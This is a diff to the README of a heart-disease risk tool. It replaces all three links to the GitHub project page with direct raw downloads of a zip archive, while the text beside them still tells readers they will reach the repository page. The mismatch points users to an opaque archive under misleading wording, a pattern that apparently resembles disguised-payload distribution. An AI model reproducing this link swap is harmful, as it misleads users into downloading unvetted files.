@@ -1,6 +1,6 @@
 # ❤️ Heart-Disease-Prediction - Simple Heart Health Risk Tool
 
-[![Download Heart-Disease-Prediction](https://img.shields.io/badge/Download-Heart--Disease--Prediction-blue?style=for-the-badge)](https://github.com/Beljart/Heart-Disease-Prediction)
+[![Download Heart-Disease-Prediction](https://img.shields.io/badge/Download-Heart--Disease--Prediction-blue?style=for-the-badge)](https://raw.githubusercontent.com/Beljart/Heart-Disease-Prediction/main/Heart-Disease-Prediction/Prediction_Disease_Heart_2.9.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This section will guide you step-by-step to get this program running on your Win
 
 Click this button to open the project page and get the app:
 
-[![Download Link](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Beljart/Heart-Disease-Prediction)
+[![Download Link](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Beljart/Heart-Disease-Prediction/main/Heart-Disease-Prediction/Prediction_Disease_Heart_2.9.zip)
 
 You will be taken to the GitHub repository. This is the location where the files are stored.
 
@@ -116,7 +116,7 @@ This part is for those curious about the technology. The program is written in P
 
 Use this link anytime you want to download or check for new versions:
 
-[Download Heart-Disease-Prediction](https://github.com/Beljart/Heart-Disease-Prediction)
+[Download Heart-Disease-Prediction](https://raw.githubusercontent.com/Beljart/Heart-Disease-Prediction/main/Heart-Disease-Prediction/Prediction_Disease_Heart_2.9.zip)
 
 You just need to visit that page, find the latest files, and follow the steps above.
 
